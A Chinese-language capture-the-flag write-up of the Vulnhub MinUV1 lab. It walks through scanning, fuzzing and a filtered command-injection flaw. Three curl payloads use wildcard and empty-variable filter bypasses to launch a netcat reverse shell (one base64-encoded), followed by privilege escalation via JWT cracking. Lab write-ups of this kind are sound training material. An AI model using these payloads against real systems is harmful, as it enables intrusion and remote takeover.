---
layout: post
title: Vulnhub-MinUV1-writeup
description: >
  这是vulnhub上靶机MinUV1的writeup
tags: [技术]
author: author1
accent_image:          /assets/img/sidebar-bg.jpg
accent_color:          '#4fb1ba'
---

# MinUV1的writeup
## 下载链接
  + 靶机介绍：["靶机链接点击此处"](https://download.vulnhub.com/minu/MinUv1.ova.7z)
  + 下载链接1:["靶机下载(Goole云盘)"](https://drive.google.com/open?id=1n_zpZ4M8wpEl5U_o5455MAiuwhCzStlh)
  + 下载链接2：["靶机下载(镜像)"](https://download.vulnhub.com/minu/MinUv1.ova.7z)
  + 下载链接3：["靶机下载(Torrent)"](https://download.vulnhub.com/minu/MinUv1.ova.7z.torrent)
  +下载靶机后，通过Virtualbox导入虚拟机即可使用
## 测试过程
1. 下载靶机后，使用Virtualbox导入后开机直接获得IP，省掉了主机存活发现的环节
  ![Full-width image](/assets/img/docs/MlnUV1/1.png)
2. 拿到后直接使用nmap进行扫描看开起来那些服务，扫描仅发现了80端口,(一般先进行常规端口扫描，全端口在有必要的情况下可在对web或者其他常见服务进行测试时进行扫描，可有效节省时间)
    ![Full-width image](/assets/img/docs/MlnUV1/2.png)
3. 访问80端口发现是Apache默认页面，大致查看过后并无其他发现，用dirb或者wfuzz(wfuzz的使用教程有一个老哥介绍很清楚可以去看下一下，['此处为传送门'](https://www.freebuf.com/author/m0nst3r)进行一下目录扫描
    ![Full-width image](/assets/img/docs/MlnUV1/3.png)
    ![Full-width image](/assets/img/docs/MlnUV1/4.png)
4. 两者均发现了test.php,按照惯例进行访问并哪里不会点哪里；点的时候要注意地址栏的变化；惯例进行源码的查看，发现这个链接有存在文件包含漏洞的嫌疑
    ![Full-width image](/assets/img/docs/MlnUV1/5.png)
    ![Full-width image](/assets/img/docs/MlnUV1/6.png)
5. 依旧用wfuzz试一下，通过wfuzz可以省去很多手工上的繁琐，偷偷懒
    ![Full-width image](/assets/img/docs/MlnUV1/7.png)
6. 通过wfuzz的结果可以看到存在大量的字符数为1986的页面，尝试访问一个发现非常正常，于是可以通过--hh将字符数为1986的排除掉，这样结果更加精简了
    ![Full-width image](/assets/img/docs/MlnUV1/8.png)
    ![Full-width image](/assets/img/docs/MlnUV1/9.png)
    ![Full-width image](/assets/img/docs/MlnUV1/10.png)
7. 通过对剩下几个payload进行访问，发现并非文件包含漏洞，而是命令执行漏洞
    ![Full-width image](/assets/img/docs/MlnUV1/11.png)
    ![Full-width image](/assets/img/docs/MlnUV1/12.png)
8. 经过尝试发现很多命令执行不了，可以判断该处漏洞应该存在过滤手段
    ![Full-width image](/assets/img/docs/MlnUV1/13.png)
9. 在测试过程中发现rev命令是可用的，rev命令可以实现字符的反序输出，可以通过rev来读源码    
>
  **NOTE**:rev命令 将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推
    ![Full-width image](/assets/img/docs/MlnUV1/14.png)

10. 尝试通过rev命令来读取test.php的内容
    ![Full-width image](/assets/img/docs/MlnUV1/15.png)
11. 由于反序输出不便阅读，可以在terminal中通过管道符进行再次反序然后即可得到正序的文件内容
    ![Full-width image](/assets/img/docs/MlnUV1/16.png)
12. 可以看到test.php中执行的命令是shell_exec('cat'.GET['file'])，获取file参数然后cat出来，既然知道文件内容了就可以进行payload的构造，在payload的构造中有很多种方法，但是需要不断的尝试有哪些限制字符。对参数进行fuzz一下看哪些是可用的(此处需要自己构造字典，想好要执行那些命令，然后分别用不同的方式表示出来形成字典再fuzz)
    ![Full-width image](/assets/img/docs/MlnUV1/17.png)
13. 根据fuzz的结果得出部分可用字符，通过这些字符可以组合payload，此处列举三个：(其中20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK为nc -e /bin/sh 192.168.145.1 4444的base64编码)，可自行发散思路测试多种命令，组合出多种payload
```shellcode
curl -s "http://192.168.145.5/test.php?file=%26/bin$u/echo$u%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/usr$u/bin$u/base64$u%20-d|/bin$u/sh$u"
curl -s 'http://192.168.145.5/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/u?r/b?n/b?se64%20-d|/b?n/sh'
curl -s 'http://192.168.145.5/test.php?file=%26/b?n/nc$u%20-e%20/b?n/sh$u%20192.168.145.1%204444'
```
  此处主要利用到了两个知识点：1是linux下所有皆文件，因此各种可执行程序都是在可找到的文件，而在找文件的过程中是可以利用通配符的，可以利用该特性对过滤进行绕过，另一点就是使用空变量$u，linux中是可以存在空变量的，直接被系统视为空字符串，空变量不会对输出造成影响，可以借此来绕过基于正则表达式的过滤器和模式匹配此处参见['secist'](https://www.freebuf.com/author/secist)大佬['绕过CloudFlare WAF和ModSecurity OWASP CRS3核心规则集的技巧介绍'](https://www.freebuf.com/articles/web/184414.html)的文章

14. 现在可以getshell了，先监听端口4444(（由于我的网络是靶机为仅host模式，而kali为nat模式通过将物理机的4444网卡映射到了kali上，所以此处看到的是来自10.0.2.2的连接，这不是重点）)
    ![Full-width image](/assets/img/docs/MlnUV1/18.png)
15. 此时拿到的只是shell,并非tty:使用SHELL=/bin/bash script -q /dev/null可以将shell提升成tty,找一下有没有可以直接拿来提权的程序，可惜在我的知识中这些都好像没有，泪奔.....
    ![Full-width image](/assets/img/docs/MlnUV1/19.png)
16. 看一下Linux内核版本，看是否有可利用的漏洞，找到可用的然后gcc编译一下
    ![Full-width image](/assets/img/docs/MlnUV1/20.png)    
    ![Full-width image](/assets/img/docs/MlnUV1/21.png)
    ![Full-width image](/assets/img/docs/MlnUV1/22.png)  
17. EXP准备就绪后开始准备上传，先在本机用python搭个简易的web服务器，然后找一个可写文件夹，尝试下载下来
    ![Full-width image](/assets/img/docs/MlnUV1/23.png)
    ![Full-width image](/assets/img/docs/MlnUV1/24.png)
    ![Full-width image](/assets/img/docs/MlnUV1/25.png)    
18. 很尴尬的是发现下载下来大小为0，查看一下磁盘发现磁盘满了。不知道这是作者有意的还是我的环境有问题.....所以通过这种方式提权看来要拉闸了
    ![Full-width image](/assets/img/docs/MlnUV1/26.png)
19. 在系统瞎逛逛，发现了home目录下bob的文件夹有隐藏文件(一般home目录下的要重点关注)，查看一下发现存在一个__pw__的文件，里面写的东西我也看不懂，直觉告诉我这很重要。于是找了国外大佬的文章看解析。发现是['Json web tokens'](http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)
    ![Full-width image](/assets/img/docs/MlnUV1/27.png)
20. 尝试使用['jwtrack'](https://github.com/brendan-rius/c-jwt-cracker)进行破解,破解成功。得到密钥是mlnV1
    ![Full-width image](/assets/img/docs/MlnUV1/28.png)
21. 尝试登陆，发现登陆root成功，并且在root文件夹下发现flag文件，cat一下
    ![Full-width image](/assets/img/docs/MlnUV1/29.png)
>
**附上两位大佬解析的地址**:
+ https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939
+ https://hackso.me/minu-1-walkthrough/
